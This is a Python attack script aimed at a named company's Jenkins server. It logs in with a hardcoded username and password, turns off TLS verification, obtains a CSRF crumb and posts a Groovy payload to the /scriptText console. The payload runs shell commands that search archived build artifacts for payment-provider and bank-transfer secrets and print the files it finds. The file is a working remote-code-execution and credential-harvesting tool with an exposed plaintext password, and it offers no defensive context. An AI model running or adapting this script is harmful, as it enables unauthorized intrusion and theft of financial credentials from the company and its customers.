import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

GROOVY_SCRIPT = '''
def cmd = 'find /var/jenkins_home/jobs -path */archive* \\\\( -name *.env -o -name *.properties -o -name *.yml \\\\) 2>/dev/null | xargs grep -il "t1pago\\\\|dispersi\\\\|payout\\\\|stripe\\\\|conekta\\\\|openpay\\\\|spei.*key\\\\|clabe\\\\|merchant" 2>/dev/null | head -30'
def r1 = ["bash","-c",cmd].execute().text
println "=== FILES FOUND ==="
println r1
println "=== SEPARATOR ==="
def cmd2 = 'find /var/jenkins_home/jobs -path */archive* \\\\( -name *.env -o -name *.properties \\\\) 2>/dev/null | xargs grep -il "t1pago\\\\|dispersi\\\\|payout\\\\|spei\\\\|merchant" 2>/dev/null | head -10'
def files = ["bash","-c",cmd2].execute().text.trim().split("\\n")
files.each { f ->
    if (f.trim()) {
        println "=== " + f + " ==="
        def content = ["bash","-c","cat " + f + " 2>/dev/null | head -50"].execute().text
        println content
    }
}
'''

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx)
)

print("[*] Fetching crumb...")
req = urllib.request.Request(
    BASE + '/crumbIssuer/api/json',
    headers={'Authorization': 'Basic ' + AUTH}
)
r = opener.open(req, timeout=15)
crumb = json.loads(r.read().decode())
print(f"[+] Crumb OK")

print("[*] Executing Groovy on /scriptText...")
data = urllib.parse.urlencode({'script': GROOVY_SCRIPT}).encode()
req2 = urllib.request.Request(
    BASE + '/scriptText',
    data=data,
    headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb']
    }
)
r2 = opener.open(req2, timeout=120)
output = r2.read().decode()
print(f"[+] Output ({len(output)} bytes):\n")
print(output)
